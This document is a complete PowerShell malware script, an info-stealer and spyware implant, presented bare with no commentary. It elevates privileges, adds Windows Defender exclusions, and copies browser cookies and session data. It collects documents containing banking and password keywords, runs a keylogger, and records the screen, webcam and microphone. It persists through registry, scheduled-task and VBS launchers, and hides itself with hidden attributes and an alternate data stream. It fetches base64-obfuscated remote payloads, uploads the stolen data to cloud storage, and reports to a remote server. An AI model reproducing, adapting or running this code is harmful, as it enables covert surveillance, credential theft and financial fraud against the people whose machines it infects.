$tempDir = "$env:TEMP\system_cache"
$fileDumpDir = "$tempDir\files"
$videoSubDir = "$tempDir\video"
$logPath = "$tempDir\log.json"
$macroInputPath = "$tempDir\macroInput.txt"
$global:lastVideoUpload = Get-Date
$mainPath = "$env:APPDATA\Microsoft\Windows\system_cache"
$scriptPath = "$env:APPDATA\AudioDriver\A.ps1"
$watchdogPath = "$env:APPDATA\AudioDriver\watchdog.ps1"
$sessionDataDir = "$env:USERPROFILE\sessionData"
New-Item -ItemType Directory -Force -Path $tempDir, $fileDumpDir, $videoSubDir | Out-Null
$watchdogDir = Split-Path $watchdogPath
if (!(Test-Path $watchdogDir)) {
    New-Item -ItemType Directory -Path $watchdogDir -Force | Out-Null
}
function Decode-Url($base64) {
    return [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($base64))
}
$releasesUrl = Decode-Url "aAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBFAHgANgBUAGUAbgBaAHoALwBmAC8AcgBlAGwAZQBhAHMAZXMvAGQAbwB3AG4AbABvAGEAZAAvAHYAMQAuMAAvAA=="
$pagesUrl    = Decode-Url "aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC8A"
$serverUrl   = Decode-Url "aAB0AHQAcABzADoALwAvAHMAZQByAHYAZQByAC4AMQAxAG4ALgB3AG8AcgBrAGUAcgBzAC4AZABlAHYALwA="
$versionURL  = Decode-Url "aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC92AGUAcgBzAGkAbwBuAC4AdAB4AHQ="
$payloadURL  = Decode-Url "aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC8AQQAuAHAAcwAxAA=="
Start-Transcript -Path "$tempDir\session.log" -Append

function Test-Admin {
    try {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
        $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        if (-not $isAdmin) {
            $arguments = "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
            Start-Process -FilePath "powershell.exe" -ArgumentList $arguments -Verb RunAs
            exit
        }
        return $true
    } catch {
        Write-Error "Failed to check or elevate to administrator: $_"
        return $false
    }
}


function Set-DefenderExclusions {
    try {
        $path = $MyInvocation.MyCommand.Path
        if ([string]::IsNullOrWhiteSpace($path)) {
            $path = $PSScriptRoot
        } else {
            $path = Split-Path -Parent $path
        }
        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
            if ($path) {
                Set-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
            }
            Set-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
            Set-MpPreference -ExclusionExtension ".ps1" -ErrorAction SilentlyContinue
            Set-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
            Write-Host "Defender exclusions added for path: $path"
        } else {
            Write-Warning "Set-MpPreference not available (Defender module missing or not Windows 10/11)"
        }
    } catch {
        Write-Warning "Could not add exclusions to Defender: $_"
    }
}

function Get-SessionData {
    $targets = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data",
        "$env:APPDATA\Mozilla\Firefox\Profiles",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    )
    $patterns = @("*Cookies*", "*.sqlite", "*.ldb", "*.log")
    foreach ($root in $targets) {
        if (Test-Path $root) {
            Get-ChildItem -Path $root -Recurse -Include $patterns -File -ErrorAction SilentlyContinue |
            Where-Object { $_.Length -gt 0 } |
            ForEach-Object {
                try {
                    $relative = $_.FullName.Substring($root.Length).TrimStart('\')
                    $destDir = Join-Path $sessionDataDir ([IO.Path]::GetDirectoryName($relative))
                    if (!(Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null }
                    $destFile = Join-Path $sessionDataDir $relative
                    Copy-Item $_.FullName $destFile -Force -ErrorAction Stop
                } catch {}
            }
        }
    }
}

function Get-Files {
    $targets = @("Desktop", "Documents", "Downloads") | ForEach-Object { "$env:USERPROFILE\$_" }
    $extensions = "*.pdf", "*.doc*", "*.xls*", "*.txt"
    $keywords = @("haslo", "login", "password", "secret", "bank", "karta", "card", "visa", "dane", "konto", "portfel", "millenium", "pko", "pekao", "sber", "wallet")
    $maxSize = 5MB

    foreach ($dir in $targets) {
        foreach ($ext in $extensions) {
            Get-ChildItem -Path $dir -Recurse -Include $ext -File -ErrorAction SilentlyContinue | ForEach-Object {
                $file = $_
                if ($file.Length -le $maxSize -and $file.Name) {
                    try {
                        $content = Get-Content $file.FullName -ErrorAction SilentlyContinue -Raw -Encoding UTF8
                        foreach ($kw in $keywords) {
                            if ($content -match $kw) {
                                $relative = Resolve-Path -Path $file.FullName | ForEach-Object {
                                    $_.Path.Substring($dir.Length).TrimStart('\')
                                }
                                $destDir = Join-Path $fileDumpDir ([IO.Path]::GetDirectoryName($relative))
                                if (!(Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null }
                                $destFile = Join-Path $fileDumpDir $relative
                                Copy-Item $file.FullName $destFile -Force -ErrorAction Stop
                                break
                            }
                        }
                    } catch {}
                }
            }
        }
    }
}

function Set-Autostart {
    $path = "$env:APPDATA\Microsoft\Windows\system_cache"
    $repoReleases = $releasesUrl
    $repoPages = $pagesUrl
    $filesFromReleases = @("ffmpeg.exe", "rclone.exe")
    $filesFromPages = @("system_cache.ps1", "rclone.conf", "setup.vbs", "TaskService.vbs")

    if (!(Test-Path $path)) {
        New-Item -ItemType Directory -Path $path -Force | Out-Null
    }

    foreach ($f in $filesFromReleases) {
        $dest = "$path\$f"
        if (!(Test-Path $dest)) {
            try {
                Invoke-WebRequest "$repoReleases/$f" -OutFile $dest -UseBasicParsing -TimeoutSec 10
                Write-Output "Downloaded from Releases: $f"
            } catch {
                Write-Warning "Failed to download $f from Releases: $_"
            }
        }
    }

    foreach ($f in $filesFromPages) {
        $dest = "$path\$f"
        if (!(Test-Path $dest)) {
            try {
                Invoke-WebRequest "$repoPages/$f" -OutFile $dest -UseBasicParsing -TimeoutSec 10
                Write-Output "Downloaded from Pages: $f"
            } catch {
                Write-Warning "Failed to download $f from Pages: $_"
            }
        }
    }

    $vbsLauncher = "$path\TaskService.vbs"
    if (Test-Path $vbsLauncher) {
        try {
            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
                -Name "TaskService" -Value $vbsLauncher -ErrorAction Stop
            Write-Output "Autostart via VBS registered: $vbsLauncher"
        } catch {
            Write-Warning "Failed to set autostart: $_"
        }
    }
}


function Install-Watchdog {
    if (!(Test-Path $watchdogPath)) {
        @"
$ErrorActionPreference = "SilentlyContinue"
while ($true) {
    $proc = Get-Process powershell | Where-Object { $_.Path -eq "SCRIPTPATH" }
    if (-not $proc) {
        Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File ""SCRIPTPATH""" -WindowStyle Hidden
    }
    Start-Sleep -Seconds 30
}
"@ -replace "SCRIPTPATH",$scriptPath | Set-Content -Path $watchdogPath -Encoding UTF8
    }
    if (Test-Path $watchdogPath) {
        schtasks /Create /SC ONLOGON /RL HIGHEST /TN "AudioDriver Watchdog" /TR "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watchdogPath`"" /F | Out-Null
    }
}

function Test-Update {
    try {
        $remoteVersion = Invoke-WebRequest -Uri $versionURL -UseBasicParsing -ErrorAction Stop | Select-Object -ExpandProperty Content
        $localVersion = "1.0.0"
        if ($remoteVersion.Trim() -ne $localVersion) {
            $b64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Invoke-WebRequest $payloadURL).Content))
            Start-Process powershell -ArgumentList "-EncodedCommand $b64" -WindowStyle Hidden
            exit
        }
    } catch { }
}

function Test-DeviceActive($ffmpeg, $type, $name) {
    $testArgs = @("-f", "dshow", "-list_options", "true", "-i", "$type=$name")
    $result = & $ffmpeg $testArgs 2>&1
    if ($result -match "Could not find" -or $result -match "No .* devices found" -or $result -match "error") {
        return $false
    }
    return $true
}

function Start-Recording {
    $ffmpeg = "$PSScriptRoot\ffmpeg.exe"
    if (!(Test-Path $videoSubDir)) {
        New-Item -ItemType Directory -Path $videoSubDir -Force | Out-Null
    }
    $file = "$videoSubDir\frag_$(Get-Date -Format 'yyyyMMdd_HHmmss').mp4"
    $duration = 60
    $raw = & $ffmpeg -list_devices true -f dshow -i dummy 2>&1
    $videoList = ($raw | Where-Object { $_ -match '\".+\"' -and $_ -match '\(video\)' }) | ForEach-Object {
        ($_ -replace '.*\"(.+?)\".*', '$1')
    }
    $audioList = ($raw | Where-Object { $_ -match '\".+\"' -and $_ -match '\(audio\)' }) | ForEach-Object {
        ($_ -replace '.*\"(.+?)\".*', '$1')
    }
    $activeVideos = @()
    foreach ($v in $videoList) {
        if (Test-DeviceActive $ffmpeg "video" $v) { $activeVideos += $v }
    }
    $activeAudios = @()
    foreach ($a in $audioList) {
        if (Test-DeviceActive $ffmpeg "audio" $a) { $activeAudios += $a }
    }
    $desktop = @("-f", "gdigrab", "-framerate", "15", "-i", "desktop")
    $combinations = @()
    foreach ($audio in $activeAudios + $null) {
        foreach ($video in $activeVideos + $null) {
            $combinations += ,@($video, $audio)
        }
    }
    foreach ($combo in $combinations) {
        $video = $combo[0]
        $audio = $combo[1]
        $ffmpegArgs = @("-y") + $desktop
        if ($video) {
            $ffmpegArgs += @("-f", "dshow", "-rtbufsize", "512M", "-framerate", "15", "-i", "video=$video")
        }
        if ($audio) {
            $ffmpegArgs += @("-f", "dshow", "-rtbufsize", "512M", "-framerate", "15", "-i", "audio=$audio")
        }
        if ($video -and $audio) {
            $ffmpegArgs += @("-map", "0:v:0", "-map", "1:v:0", "-map", "2:a:0")
            $ffmpegArgs += @(
                "-filter_complex",
                "[0:v]scale=1280:720[v0];[1:v]scale=1280:720[v1];[v0][v1]hstack=inputs=2[v]",
                "-map", "[v]"
            )
            $ffmpegArgs += @("-vcodec", "libx264", "-preset", "veryfast", "-acodec", "aac", "-ar", "44100", "-b:a", "128k")
        } elseif ($video) {
            $ffmpegArgs += @("-map", "0:v:0", "-map", "1:v:0")
            $ffmpegArgs += @("-filter_complex", "[0:v][1:v]hstack=inputs=2[v]", "-map", "[v]")
            $ffmpegArgs += @("-vcodec", "libx264", "-preset", "veryfast", "-acodec", "aac", "-ar", "44100", "-b:a", "128k")
            $ffmpegArgs += @("-vcodec", "libx264", "-preset", "veryfast")
        } elseif ($audio) {
            $ffmpegArgs += @("-map", "0:v:0", "-map", "1:a:0")
            $ffmpegArgs += @("-vcodec", "libx264", "-preset", "veryfast", "-acodec", "aac", "-ar", "44100", "-b:a", "128k")
        } else {
            $ffmpegArgs += @("-map", "0:v:0", "-an", "-vcodec", "libx264", "-preset", "veryfast")
        }
        $ffmpegArgs += @("-t", "$duration", "$file")
        try {
            & $ffmpeg $ffmpegArgs
            if (Test-Path $file) {
                Write-Output "Recorded: $file"
                return $file
            } else {
                Write-Warning "No file with video=$video / audio=$audio"
            }
        } catch {
            Write-Warning "ffmpeg error: $_"
        }
    }

    $file = "$videoSubDir\screen_only_$(Get-Date -Format 'yyyyMMdd_HHmmss').mp4"
    $ffmpegArgs = @("-y") + $desktop + @("-map", "0:v:0", "-an", "-vcodec", "libx264", "-preset", "veryfast", "-t", "$duration", "$file")
    try {
        & $ffmpeg $ffmpegArgs
        if (Test-Path $file) {
            Write-Output "Fallback: only screen: $file"
            return $file
        }
    } catch {
        Write-Warning "No fallback: $_"
    }

    return $null
}

function Hide-Folder {
    if (!(Test-Path $mainPath)) {
        New-Item -ItemType Directory -Path $mainPath | Out-Null
    }

    attrib +s +h $mainPath

    Get-ChildItem -Path $mainPath -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            attrib +s +h $_.FullName
        } catch {}
    }
}


"" | Out-File -Encoding utf8 -Force $macroInputPath
Start-Job -ScriptBlock {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -TypeDefinition @'
        using System;
        using System.Runtime.InteropServices;
        public class MacroInputLogger {
            [DllImport("User32.dll")] public static extern short GetAsyncKeyState(Int32 vKey);
            [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
            [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
        }
'@
    $lastWindow = ""
    $line = ""
    $lastInputTime = Get-Date
    $timeoutSec = 2
    while ($true) {
        $sb = New-Object System.Text.StringBuilder 256
        $hWnd = [MacroInputLogger]::GetForegroundWindow()
        [MacroInputLogger]::GetWindowText($hWnd, $sb, $sb.Capacity) | Out-Null
        $windowTitle = $sb.ToString()
        $now = Get-Date
        for ($i = 1; $i -le 255; $i++) {
            $state = [MacroInputLogger]::GetAsyncKeyState($i)
            if ($state -eq -32767) {
                if ($i -eq 8) {
                    if ($line.Length -gt 0) { $line = $line.Substring(0, $line.Length-1) }
                } elseif ($i -eq 13) {
                    if ($line.Trim().Length -gt 0) {
                        $out = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$windowTitle] $line"
                        Add-Content -Path $using:macroInputPath -Value $out
                        $line = ""
                    }
                } else {
                    $ch = [char]$i
                    $line += $ch
                }
                $lastInputTime = $now
            }
        }
        if (($windowTitle -ne $lastWindow -or ($line.Length -gt 0 -and ($now - $lastInputTime).TotalSeconds -ge $timeoutSec))) {
            if ($line.Trim().Length -gt 0) {
                $out = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$windowTitle] $line"
                Add-Content -Path $using:macroInputPath -Value $out
                $line = ""
            }
            $lastWindow = $windowTitle
        }
        Start-Sleep -Milliseconds 50
    }
}


function Hide-In-ADS {
    $targetFile = "$env:APPDATA\Microsoft\Windows\file.txt"
    $adsName = "hidden.ps1"
    $sourcePath = $MyInvocation.MyCommand.Path

    if (!(Test-Path $targetFile)) {
        " " | Set-Content -Path $targetFile -Encoding ASCII
        attrib +s +h $targetFile
    }
    $adsPath = "$targetFile`:$adsName"
    Copy-Item -Path $sourcePath -Destination $adsPath -Force
    attrib +s +h $adsPath
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$adsPath`""
}


function New-SetupLauncher {
    $vbsPath = "$env:APPDATA\Microsoft\Windows\system_cache\TaskService.vbs"
    $batPath = "$env:APPDATA\Microsoft\Windows\system_cache\setup_launcher.bat"
    $ps1url = Decode-Url "aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC8AQQAuAHAAcwAxAA=="
    $vbs = @'
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File %APPDATA%\Microsoft\Windows\system_cache\A.ps1", 0
'@
    Set-Content -Path $vbsPath -Value $vbs -Encoding ascii
    $bat = "@echo off`r`npowershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command `"Invoke-WebRequest -Uri '$ps1url' -OutFile '%APPDATA%\Microsoft\Windows\system_cache\AudioHost.ps1'; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -WindowStyle Hidden -File %APPDATA%\Microsoft\Windows\system_cache\A.ps1'`""
    Set-Content -Path $batPath -Value $bat -Encoding ascii
}


function Export-And-Report {
    $user = $env:USERNAME
    $remoteBase = "onedrive:system_cache_uploads/$user"
    $rcloneExe = "$env:APPDATA\Microsoft\Windows\system_cache\rclone.exe"
    $rcloneConf = "$env:APPDATA\Microsoft\Windows\system_cache\rclone.conf"
    $sessionDataDir = "$env:USERPROFILE\sessionData"
    $sentLog = "$env:APPDATA\Microsoft\Windows\system_cache\sent_files.json"
    if (!(Test-Path $sentLog)) { @{} | ConvertTo-Json | Set-Content $sentLog }
    $sent = Get-Content $sentLog | ConvertFrom-Json

    $pathsToSend = @(
        @{ Path = $sessionDataDir; Remote = "$remoteBase/sessionData" },
        @{ Path = $fileDumpDir; Remote = "$remoteBase/files" },
        @{ Path = $videoSubDir; Remote = "$remoteBase/video" },
        @{ Path = $logPath; Remote = "$remoteBase/log.json" },
        @{ Path = $macroInputPath; Remote = "$remoteBase/macroInput.txt" }
    )

    foreach ($entry in $pathsToSend) {
        $src = $entry.Path
        $dst = $entry.Remote
        if (Test-Path $src) {
            $items = if ((Get-Item $src).PSIsContainer) {
                Get-ChildItem -Path $src -Recurse -File
            } else {
                @(Get-Item $src)
            }
            foreach ($item in $items) {
                $key = $item.FullName
                $hash = (Get-FileHash $item.FullName -Algorithm SHA256).Hash
                if ($sent[$key] -eq $hash) { continue }
                $success = $false
                for ($i=0; $i -lt 3; $i++) {
                    try {
                        & $rcloneExe copyto "$($item.FullName)" (Join-Path $dst $item.Name) --config "$rcloneConf" --quiet
                        $success = $true
                        break
                    } catch { Start-Sleep -Seconds 5 }
                }
                if ($success) { $sent[$key] = $hash }
            }
        }
    }
    $sent | ConvertTo-Json | Set-Content $sentLog

    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $summary = @"
PowerShell Report
User: $user
Machine: $env:COMPUTERNAME
Time: $timestamp
SessionData: $(if (Test-Path $sessionDataDir) { (Get-ChildItem $sessionDataDir -File -ErrorAction SilentlyContinue | Measure-Object).Count } else { 0 })
Files: $(if (Test-Path $fileDumpDir) { (Get-ChildItem $fileDumpDir -File -ErrorAction SilentlyContinue | Measure-Object).Count } else { 0 })
Videos: $(if (Test-Path $videoSubDir) { (Get-ChildItem $videoSubDir -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -eq ".mp4" } | Measure-Object).Count } else { 0 })
CloudPath: $remoteBase
"@

    try {
        $json = @{ text = $summary } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "$serverUrl/r" -Method POST -Body $json -ContentType "application/json"
    } catch {
        Write-Warning "Failed to send report: $_"
    }
}

function Update-RcloneConf {
    $remoteConfUrl = "$pagesUrl/rclone.conf"
    $localConf = "$env:APPDATA\Microsoft\Windows\system_cache\rclone.conf"
    try {
        $remoteInfo = Invoke-WebRequest -Uri $remoteConfUrl -UseBasicParsing -Method Head -ErrorAction Stop
        $remoteDate = $remoteInfo.Headers["Last-Modified"]
        $localDate = if (Test-Path $localConf) { (Get-Item $localConf).LastWriteTimeUtc } else { [datetime]::MinValue }
        if ($remoteDate) {
            $remoteDate = [datetime]::Parse($remoteDate).ToUniversalTime()
            if ($remoteDate -gt $localDate) {
                Invoke-WebRequest -Uri $remoteConfUrl -OutFile $localConf -UseBasicParsing -ErrorAction Stop
                Write-Output "rclone.conf updated from server"
            }
        } elseif (!(Test-Path $localConf)) {
            Invoke-WebRequest -Uri $remoteConfUrl -OutFile $localConf -UseBasicParsing -ErrorAction Stop
            Write-Output "rclone.conf downloaded (no local copy)"
        }
    } catch {
        Write-Warning "Failed to update rclone.conf: $_"
    }
}

function Wait-ForFiles {
    param([string[]]$files, [int]$timeoutSec = 120)
    $start = Get-Date
    while ($true) {
        $missing = $files | Where-Object { -not (Test-Path $_) }
        if ($missing.Count -eq 0) { break }
        if ((Get-Date) - $start -gt (New-TimeSpan -Seconds $timeoutSec)) {
            throw "Timeout waiting for files: $($missing -join ', ')"
        }
        Start-Sleep -Seconds 2
    }
}

Wait-ForFiles @(
    "$env:APPDATA\Microsoft\Windows\system_cache\ffmpeg.exe",
    "$env:APPDATA\Microsoft\Windows\system_cache\rclone.exe",
    "$env:APPDATA\Microsoft\Windows\system_cache\rclone.conf"
)

Update-RcloneConf

Test-Admin
Set-DefenderExclusions
Set-Autostart
Install-Watchdog
New-SetupLauncher
Hide-Folder
Hide-In-ADS

while ($true) {
    Get-SessionData
    Get-Files
    Start-Recording
    Export-And-Report
    Test-Update
    Update-RcloneConf
    Start-Sleep -Seconds 10
}
